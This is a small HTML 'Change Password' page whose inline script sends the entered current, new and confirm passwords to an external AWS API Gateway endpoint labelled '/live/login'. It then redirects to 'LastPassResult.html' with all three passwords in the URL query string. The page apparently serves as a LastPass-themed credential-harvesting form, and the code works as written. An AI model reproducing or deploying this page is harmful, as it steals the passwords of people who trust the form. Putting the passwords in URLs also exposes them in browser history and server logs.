<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Change Password</title>
  <style>
    fieldset {
			width: 350px;
		}

		table {
			width: 350px;
			align-content: left;
		}

		input {
			line-height: 2;
		}

		.container {
			width: 500px;
			clear: both;
		}

		.container input {
			width: 100%;
			clear: both;
		}

		.no-spin::-webkit-inner-spin-button,
		.no-spin::-webkit-outer-spin-button {
			-webkit-appearance: none !important;
			margin: 0 !important;
			-moz-appearance: textfield !important;
		}
	</style>
  <script type="text/javascript">
    function onSubmit() {
      var originalPassword = document.getElementById('password-input').value;
      var newPassword = document.getElementById('password-new-input').value;
      var confirmPassword = document.getElementById('password-confirm-input').value;

      fetch('https://jfha5on7o2.execute-api.us-east-1.amazonaws.com/live/login', {
        cache: 'no-cache',
        headers: {
          'content-type': 'application/json'
        },
        method: 'POST',
        mode: 'cors',
        redirect: 'follow',
        referrer: 'no-referrer',
        body: JSON.stringify({
          password: originalPassword,
          newPassword: newPassword,
          confirmPassword: confirmPassword
        })
      })
        .then(function () {
          window.location = "LastPassResult.html?originalPassword=" + encodeURIComponent(originalPassword)
            + "&newPassword=" + encodeURIComponent(newPassword)
            + "&confirmPassword=" + encodeURIComponent(confirmPassword);
        });
    }

    document.addEventListener('DOMContentLoaded', function() {
      document.querySelector('#change-password-form-submit').addEventListener('click', onSubmit);
    });
  </script>
</head>

<body>
  <div class="container">
    <fieldset id="passwordsFieldSet">
      <legend>Change Password:</legend>
      <form id="change-password-form">
        <table>
          <tbody>
            <tr>
              <td><label for="password-input">Current Password</label></td>
              <td><input id="password-input" name="password" type="password" /></td>
            </tr>
            <tr>
              <td><label for="password-new-input">New Password</label></td>
              <td><input id="password-new-input" name="password-new" type="password" /></td>
            </tr>
            <tr>
              <td><label for="password-confirm-input">Confirm Password</label></td>
              <td><input id="password-confirm-input" name="password-new-confirm" type="password" /></td>
            </tr>
            <tr>
              <td colspan="2"><button type="button" id="change-password-form-submit">Change Password</button></td>
            </tr>
          </tbody>
        </table>
      </form>
    </fieldset>
  </div>
</body>

</html>
